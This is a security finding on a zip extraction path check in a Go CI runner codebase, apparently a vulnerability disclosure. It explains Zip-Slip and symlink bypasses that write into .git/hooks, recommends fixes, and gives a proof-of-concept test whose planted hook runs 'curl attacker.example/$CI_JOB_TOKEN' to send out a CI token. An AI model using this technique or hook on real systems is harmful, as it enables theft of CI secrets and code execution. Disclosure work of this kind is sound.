### Title
Zip extraction path check can be bypassed via `..`-prefixed entry names and symlink targets, enabling writes into `.git/hooks` outside the intended extraction root - (File: helpers/archives/zip_extract.go, helpers/archives/path_check_helper.go)

### Summary
`isPathAGitDirectory` (helpers/archives/path_check_helper.go:13-19) only flags an entry as ".git-related" when `parts[0] == ".git"` after `filepath.Clean`. Entries whose cleaned path starts with `..` (e.g. `../.git/hooks/pre-commit`) are never caught, and entries reached indirectly through a malicious symlink (`extractZipSymlinkEntry`, zip_extract.go:22-39) are never checked at all, since only the file *name* is inspected, never the symlink *target* or the resolved path.

### Finding Description
`ExtractZipArchive` (zip_extract.go:85-96) calls `errorIfGitDirectory(file.Name)` purely for a warning/log — it does not block extraction (`extractZipFile` runs unconditionally right after, regardless of the check's result). Two independent bypasses exist:

1. **`..`-prefixed traversal bypass of the naming check.** `filepath.Clean("a/../.git/x")` normalizes to `.git/x`, so that specific traversal is caught. But `filepath.Clean("../.git/hooks/pre-commit")` stays `../.git/hooks/pre-commit` — Clean cannot eliminate a leading `..` with nothing to consume — so `parts[0]` is `".."`, not `".git"`, and `isPathAGitDirectory` returns `false`. No other containment check exists anywhere in `extractZipFile`/`extractZipFileEntry`/`extractZipDirectoryEntry` (zip_extract.go:12-59): `file.Name` is used verbatim in `os.MkdirAll(filepath.Dir(file.Name), ...)` and `os.OpenFile(file.Name, ...)`, so this is a classic unguarded Zip-Slip path — extraction is not confined to the target directory at all.
2. **Symlink-target bypass, independent of naming.** `isPathAGitDirectory`/`errorIfGitDirectory` inspect only the zip entry *name*, never the *target* of a symlink entry. An attacker can add a symlink entry named e.g. `link` → target `.git/hooks` (an innocuous name, passes the check trivially), followed by a regular file entry named `link/pre-commit`. `extractZipFileEntry` calls `os.OpenFile("link/pre-commit", ...)`, and the OS resolves the `link` path component through the symlink into the real `.git/hooks` directory, writing attacker content there — with the naming check never seeing anything resembling `.git` in the path used for validation is bypassed entirely.

Both flows are reachable via `ExtractZipFile` → `ExtractZipArchive`, which is used by the legacy zip extractor (`commands/helpers/archive/ziplegacy/zip_legacy_extractor.go:26-32`), itself wired into cache/artifact extraction (`commands/helpers/cache_extractor.go:646-663`, `commands/helpers/artifacts_downloader.go:125-140`), where the extraction root is simply `os.Getwd()` with no post-extraction containment verification.

### Impact Explanation
An attacker who can get a crafted zip processed as a cache or artifact archive (e.g. via a compromised/misconfigured shared cache backend, or any path where raw archive bytes reach `ExtractZipArchive` without re-derivation from real files) can write a `pre-commit` (or other) hook or rewrite `.git/config` outside of what the "children of the directory" archiver invariant is supposed to guarantee. A written hook executes on the next `git` operation performed by the job/runner, in the context of the job, with access to job environment including masked CI/GIT tokens — enabling secret exfiltration or arbitrary command execution in that job's context.

### Likelihood Explanation
Exploitability requires the attacker to control the *raw bytes* of the zip that is extracted (not merely the set of files legitimately archived by Runner's own safe archiver, which restricts entries to real children of the source directory and would not produce `..`-prefixed or symlink-into-.git entries on its own). This narrows the realistic precondition to scenarios where an externally-supplied or tampered archive is fed into `ExtractZipFile`/`ExtractZipArchive` bypassing the normal archiver step (e.g. a compromised object-storage cache backend or a custom cache/artifact source). Given that precondition, the bypass itself is trivial and fully repeatable — no timing or race is needed.

### Recommendation
Fix `errorIfGitDirectory`/`isPathAGitDirectory` and extraction to be defense-in-depth against path traversal generally, not just `.git`:
- Reject (not just warn) any entry whose cleaned path escapes the destination root: compute `filepath.Join(destDir, file.Name)` and verify with `filepath.Rel`/prefix check that the result is still inside `destDir` before any `Mkdir`/`OpenFile`/`Symlink` call.
- For symlink entries, validate the *resolved* target (after joining with destination directory) does not escape the destination root and does not resolve into a `.git` directory, in addition to validating the entry name.
- Make the `.git` check (and the new traversal check) return a hard error that aborts extraction of that entry (or the whole archive) rather than only logging a warning.

### Proof of Concept
```go
func TestIsPathAGitDirectory_BypassWithLeadingDotDot(t *testing.T) {
    // filepath.Clean cannot resolve a leading "..", so parts[0] != ".git"
    assert.False(t, isPathAGitDirectory("../.git/hooks/pre-commit"),
        "expected detection to fail, demonstrating bypass")
}

func TestExtractZipArchive_SymlinkTargetBypassesGitCheck(t *testing.T) {
    testInWorkDir(t, func(t *testing.T, fileName string) {
        f, _ := os.Create(fileName)
        w := zip.NewWriter(f)

        // symlink entry with an innocuous name pointing at .git/hooks
        hdr := &zip.FileHeader{Name: "link"}
        hdr.SetMode(os.ModeSymlink)
        sw, _ := w.CreateHeader(hdr)
        _, _ = sw.Write([]byte(".git/hooks"))

        // file entry written "through" the symlink
        fw, _ := w.Create("link/pre-commit")
        _, _ = fw.Write([]byte("#!/bin/sh\ncurl attacker.example/$CI_JOB_TOKEN"))

        w.Close()
        f.Close()

        require.NoError(t, ExtractZipFile(fileName))

        data, err := os.ReadFile(".git/hooks/pre-commit")
        require.NoError(t, err) // proves write escaped into .git/hooks undetected
        assert.Contains(t, string(data), "attacker.example")
    })
}
```
Both assertions demonstrate the naming check's blind spots described above.